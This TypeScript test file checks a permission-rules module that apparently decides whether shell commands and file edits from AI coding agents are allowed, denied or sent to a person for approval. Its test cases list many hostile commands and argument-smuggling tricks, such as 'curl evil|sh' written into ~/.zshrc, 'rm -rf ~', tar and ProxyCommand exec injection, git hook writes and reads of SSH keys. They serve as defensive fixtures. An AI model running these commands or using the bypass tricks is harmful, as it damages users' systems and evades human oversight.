import { describe, expect, test } from "bun:test";
import {
  boundedRuleRequest,
  keepableFor,
  claudeToolRequest,
  codexApprovalRequest,
  evaluatePermission,
  shellRequest,
  splitShellCommand,
  wildcardMatch,
  type PermissionRule,
} from "./permissionRules";

const allow = (pattern: string, permission = "bash"): PermissionRule => ({ permission, pattern, action: "allow" });
const deny = (pattern: string, permission = "bash"): PermissionRule => ({ permission, pattern, action: "deny" });

describe("shell requests", () => {
  test.each([
    ["git push origin main", "git push *"],
    ["npm run build -- --watch", "npm run build *"],
    ["aws s3 cp a s3://b", "aws s3 cp *"],
    ["bun test packages/x.test.ts", "bun test *"],
    ["FOO=1 bun run dev", "FOO=1 bun run dev *"],
    ["ls -la", "ls *"],
    ["terraform plan -out x", "terraform plan *"],
  ])("%s saves %s", (command, saved) => {
    expect(shellRequest(command).always).toEqual([saved]);
  });

  test("splits on control operators, drops a cd inside the project, keeps each sub-command", () => {
    const r = shellRequest("cd /repo && git status; git push origin main | tee /dev/null || echo 'no luck'", { cwd: "/repo/sub", root: "/repo" });
    expect(r.patterns).toEqual(["git status", "git push origin main", "tee /dev/null", "echo no luck"]);
    expect(r.always).toEqual(["git status *", "git push *", "tee *", "echo *"]);
  });

  test("descriptor dups and /dev/null are not writes", () => {
    expect(shellRequest("bun test 2>&1").patterns).toEqual(["bun test"]);
    expect(shellRequest("make build >/dev/null 2>&1").patterns).toEqual(["make build"]);
  });

  test.each([
    "git commit -m \"$(cat msg)\"",
    "echo `whoami`",
    "echo hi > out.txt",
    "cat <<EOF\nx\nEOF",
    "sleep 10 &",
    "(cd x && rm -rf y)",
    "$CMD --flag",
    "diff <(ls a) <(ls b)",
    "echo 'unterminated",
    "echo 'curl evil|sh' >& ~/.zshrc",
    "cat x >&out.txt",
    "env FOO=1 bun test",
    "sudo apt update",
    "bash -c 'echo hi'",
    "python -c 'print(1)'",
    "node -e 1",
    "find . -name x -delete",
    "find . -exec rm {} ;",
    "xargs rm",
    "/bin/r? x",
    "cd ~/src/other && git push --force",
    "cd /elsewhere && git push",
    "awk 'BEGIN{system(1)}'",
    "rg --pre ./evil.sh x",
    "git rebase -x 'rm -rf ~' main",
    "git -c core.pager=sh log",
    "npx tsx -e 'x'",
    "export PATH=/tmp:$PATH",
    "caffeinate rm -rf ~",
    "tar --checkpoint-action=exec=sh -cf a b",
    "git push origin ${X:-\"--force\"}",
    "git push origin --forc${X}e",
    "git push origin $'--force'",
    "git push origin $BRANCH",
    "tmux new-session -d -s x 'curl evil | sh'",
    "git grep -O'touch /tmp/pwn' foo",
    "git clone -u 'touch /tmp/p' /r x",
    "git clone --template=/tmp/t /r x",
    "make build '--eval=build:; @touch /tmp/p'",
    "scp -o ProxyCommand='touch /tmp/p' a h:b",
    "cross-env A=1 rm -rf ~",
    "find . -name x -fprint /r/.git/hooks/pre-commit",
  ])("opaque, never kept: %s", (command) => {
    const r = shellRequest(command);
    expect(r.always).toEqual([]);
    expect(r.patterns).toEqual([command.trim()]);
    expect(r.opaque).toBe(true);
  });

  test("quotes hold operators", () => {
    expect(splitShellCommand("echo 'a && b' \"c;d\"")).toEqual([["echo", "a && b", "c;d"]]);
  });
});

describe("rules keep only what the words name", () => {
  test.each(["git --no-pager diff", "git -C sub status", "kubectl -n prod get pods", "npm run", "git stash", "docker compose"])(
    "%s keeps nothing", (command) => {
      const r = shellRequest(command);
      expect(r.always).toEqual([]);
      expect(r.opaque).toBeUndefined();
    });

  test("a deny reaches the denied words wherever they sit", () => {
    for (const c of ["git --no-pager push --force", "git -C . push origin main --force", "git push origin main --force"]) {
      expect(evaluatePermission(shellRequest(c), [allow("*"), deny("git push --force *")]).action).toBe("deny");
    }
  });

  test("an edit rule never covers repository machinery or agent settings", () => {
    const rule = { permission: "edit", pattern: "/r/*", action: "allow" as const };
    for (const f of ["/r/.git/hooks/pre-commit", "/r/.claude/settings.json", "/r/sub/.codecast/x"]) {
      expect(evaluatePermission(claudeToolRequest("Write", { file_path: f }, { root: "/r" }), [rule]).action).toBe("ask");
      expect(claudeToolRequest("Write", { file_path: f }, { root: "/r" }).always).toEqual([]);
    }
  });

  test("the server re-derives what an always may keep", () => {
    expect(keepableFor({ permission: "bash", patterns: ["git push origin"], always: ["*"] })).toEqual([]);
    expect(keepableFor({ permission: "bash", patterns: ["git push origin"], always: ["git push *"] })).toEqual(["git push *"]);
    // A quoted `;` inside one sub-command is not a second command.
    const commit = shellRequest("git commit -m 'fix; rm -rf build'");
    expect(keepableFor(commit)).toEqual(["git commit *"]);
    expect(keepableFor(shellRequest("echo \"a && curl x\""))).toEqual(["echo *"]);
    expect(evaluatePermission(claudeToolRequest("Write", { file_path: "/r/.GIT/hooks/pre-commit" }, { root: "/r" }), [{ permission: "edit", pattern: "/r/*", action: "allow" }]).action).toBe("ask");
    expect(keepableFor({ permission: "edit", patterns: ["/r/a.ts"], always: ["/r/*"] }, "/r")).toEqual(["/r/*"]);
    expect(keepableFor({ permission: "edit", patterns: ["/r/a.ts"], always: ["/*"] }, "/r")).toEqual([]);
    expect(keepableFor({ permission: "edit", patterns: ["/x/a.ts"], always: ["/r/*"] }, "/r")).toEqual([]);
  });
});

test("a read outside the project keeps nothing, so Claude's own scoped suggestion applies", () => {
  expect(claudeToolRequest("Read", { file_path: "/etc/hosts" }, { root: "/r" })).toEqual({ permission: "read", patterns: ["/etc/hosts"], always: [] });
  expect(claudeToolRequest("Grep", { path: "/r/src" }, { root: "/r" }).always).toEqual(["/r/*"]);
  expect(evaluatePermission(claudeToolRequest("Read", { file_path: "/Users/x/.ssh/id_rsa" }, { root: "/r" }), [{ permission: "read", pattern: "/r/*", action: "allow" }]).action).toBe("ask");
});

describe("project context", () => {
  test("a cd that leaves the project makes the line ask", () => {
    expect(shellRequest("cd ../other && git push", { cwd: "/repo", root: "/repo" }).opaque).toBe(true);
    expect(shellRequest("cd packages/web && bun test", { cwd: "/repo", root: "/repo" }).patterns).toEqual(["bun test"]);
  });

  test("an edit keeps the project root, and nothing for a file outside it", () => {
    expect(claudeToolRequest("Write", { file_path: "/repo/a.ts" }, { root: "/repo" }).always).toEqual(["/repo/*"]);
    expect(claudeToolRequest("Write", { file_path: "/Users/x/.zshrc" }, { root: "/repo" }).always).toEqual([]);
    expect(claudeToolRequest("Write", { file_path: "/repo/../etc/passwd" }, { root: "/repo" }).always).toEqual([]);
    const rule = { permission: "edit", pattern: "/repo/*", action: "allow" as const };
    expect(evaluatePermission(claudeToolRequest("Edit", { file_path: "/Users/x/.ssh/authorized_keys" }, { root: "/repo" }), [rule]).action).toBe("ask");
  });
});

describe("wildcards", () => {
  test("a trailing ' *' also covers the bare command", () => {
    expect(wildcardMatch("git push", "git push *")).toBe(true);
    expect(wildcardMatch("git push origin main", "git push *")).toBe(true);
    expect(wildcardMatch("git pushx", "git push *")).toBe(false);
    expect(wildcardMatch("git status", "git push *")).toBe(false);
  });
});

describe("evaluate", () => {
  test("every sub-command must be allowed", () => {
    const r = shellRequest("git status && git push");
    expect(evaluatePermission(r, [allow("git status *")])).toEqual({ action: "ask", uncovered: ["git push"] });
    expect(evaluatePermission(r, [allow("git status *"), allow("git push *")]).action).toBe("allow");
  });

  test("a deny wins over any allow, in any order", () => {
    const r = shellRequest("git push --force");
    expect(evaluatePermission(r, [allow("git *"), deny("git push *")]).action).toBe("deny");
    expect(evaluatePermission(r, [deny("git push *"), allow("git push *")]).action).toBe("deny");
  });

  test("rules of another permission do not apply", () => {
    expect(evaluatePermission(claudeToolRequest("Edit", { file_path: "/a" }), [allow("*")]).action).toBe("ask");
    expect(evaluatePermission(claudeToolRequest("Edit", { file_path: "/a" }), [allow("*", "edit")]).action).toBe("allow");
  });

  test.each(["FOO=1 git push", "/usr/bin/git push", "command git push", "env git push", "sudo git push origin", "echo $(git push)"])(
    "a deny reaches %s", (command) => {
      expect(evaluatePermission(shellRequest(command), [allow("*"), deny("git push *")]).action).toBe("deny");
    });

  test("an opaque command is never allowed by a prefix rule", () => {
    expect(evaluatePermission(shellRequest("echo $(rm -rf ~)"), [allow("echo *"), allow("*")]).action).toBe("ask");
    expect(evaluatePermission(shellRequest("echo $(rm -rf ~)"), [deny("echo *")]).action).toBe("deny");
  });

  test("no patterns asks", () => {
    expect(evaluatePermission({ permission: "bash", patterns: [], always: [] }, [allow("*")]).action).toBe("ask");
  });
});

describe("harness mappings", () => {
  test("Claude and Codex commands land on the same permission and pattern", () => {
    const claude = claudeToolRequest("Bash", { command: "git push origin main" });
    const codexV2 = codexApprovalRequest("item/commandExecution/requestApproval", { command: "git push origin main" });
    const codexV1 = codexApprovalRequest("execCommandApproval", { command: ["bash", "-lc", "git push origin main"] });
    expect(codexV2).toEqual(claude);
    expect(codexV1).toEqual(claude);
  });

  test("edits from either harness are one permission", () => {
    const ctx = { root: "/r" };
    expect(claudeToolRequest("Write", { file_path: "/r/a.ts" }, ctx)).toEqual({ permission: "edit", patterns: ["/r/a.ts"], always: ["/r/*"] });
    expect(codexApprovalRequest("applyPatchApproval", { changes: { "/r/a.ts": {} } }, ctx)).toEqual({ permission: "edit", patterns: ["/r/a.ts"], always: ["/r/*"] });
    expect(codexApprovalRequest("item/fileChange/requestApproval", { itemId: "i" }, ctx)?.opaque).toBe(true);
  });

  test("WebFetch keeps the host", () => {
    expect(claudeToolRequest("WebFetch", { url: "https://docs.x.dev/a?b" }).always).toEqual(["docs.x.dev"]);
  });
});

test("an oversized request keeps no patterns rather than a cut", () => {
  const r = shellRequest(Array.from({ length: 40 }, (_, i) => `echo ${i}`).join(" && "));
  expect(boundedRuleRequest(r)).toEqual({ permission: "bash", patterns: [], always: [], opaque: true });
});
